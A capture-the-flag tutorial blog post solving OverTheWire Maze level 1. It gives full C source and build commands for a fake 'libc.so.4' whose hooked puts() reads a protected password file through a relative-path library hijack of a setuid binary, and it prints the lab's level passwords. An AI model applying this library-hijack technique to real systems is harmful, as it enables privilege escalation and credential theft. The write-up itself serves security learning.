---
date: 2023-09-18 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Maze Level 0 → 1 tutorial!!"
permalink: /posts/overTheWire-Maze-Level-0-to-1/
tags: [overthewire, maze, pwn, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Maze Level 0 → 1!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .maze-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .maze-nav .nav-left,.maze-nav .nav-center,.maze-nav .nav-right{flex:1}
  .maze-nav .nav-left{text-align:left}
  .maze-nav .nav-center{text-align:center}
  .maze-nav .nav-right{text-align:right}
  .maze-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .maze-nav a:hover{transform:translateY(-1px)}
  .maze-nav .disabled{opacity:.55}
  :root[data-theme='light'] .maze-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="maze-nav" aria-label="Maze level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Maze-Level-0/' | relative_url }}">← Previous: Level 0</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/maze/maze1.html" target="_blank" rel="noopener">
      Official (Level 1) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Maze-Level-1-to-2/' | relative_url }}">
      Next: Level 1 → 2 →
    </a>
  </div>
</nav>

## Login

Use the password from Level 0.

```bash
ssh maze1@maze.labs.overthewire.org -p 2225
# password: hashaachon
````

You’ll find the setuid binary here:

```bash
/maze/maze1
```

Running it directly shows:

```
/maze/maze1: error while loading shared libraries: ./libc.so.4:
cannot open shared object file: No such file or directory
```

---

## Task

Exploit `maze1` to leak the next password (**/etc/maze\_pass/maze2**).

The binary is tiny; decompiled pseudo-code looks like:

```c
int main(void){
  puts("Hello World!\n");
  return 0;
}
```

So the trick isn’t inside complex logic — it’s in **how the binary loads its C library**.

---

## A little bit of Theory

`maze1` is linked to a **relative** shared library named `./libc.so.4`.
That means if we place a file named **`libc.so.4`** in the **current working directory**, the dynamic loader will resolve symbols (like `puts`) from our file first.

\=> We can **hook `puts()`** by shipping a minimal shared object that:

1. reads `/etc/maze_pass/maze2`,
2. prints the password,
3. then prints the original “Hello World!” message (or our own message).

This is similar in spirit to `LD_PRELOAD`, except the binary *itself* asks for `./libc.so.4`.

---

## Solution

1. Write a fake `libc.so.4` that implements `puts()`:

```c
// hookputs.c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int puts(const char *message){
    FILE *fp;
    char buffer[64] = {0};

    fp = fopen("/etc/maze_pass/maze2", "r");
    if (fp){
        fread(buffer, 1, sizeof(buffer)-1, fp);
        fclose(fp);
        printf("The password is %s", buffer);
    } else {
        printf("Could not open password file\n");
    }

    // still print something so we see the program flow
    return printf("Hooked %s\n", message);
}
```

2. Compile it as a 32-bit shared object named **`libc.so.4`**:

```bash
gcc -m32 -fPIC -c hookputs.c
ld -shared -m elf_i386 -o libc.so.4 hookputs.o
```

> Tip: If `-m32` isn’t available, try without it; the OTW toolchain usually supports 32-bit builds.

3. Drop the library where you run the binary (e.g., `/tmp`) and execute:

```bash
cp libc.so.4 /tmp/
cd /tmp
/maze/maze1
```

Expected output:

```
The password is fooghihahr
Hooked Hello World!
```

That `fooghihahr` is the password for **maze2** ✅

---

## Troubleshooting

* **“cannot open shared object file”** → ensure the file is named exactly `libc.so.4` and you’re running `/maze/maze1` **from the directory that contains it** (e.g., `/tmp`).
* **No 32-bit toolchain** → try compiling without `-m32`.
* **Nothing printed** → add debug `printf`s in `puts()` to confirm it runs; also verify the path `/etc/maze_pass/maze2`.

---

**Congrats 🎉** You’ve hooked `puts()` and grabbed the password for **maze2**. Let’s move on!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

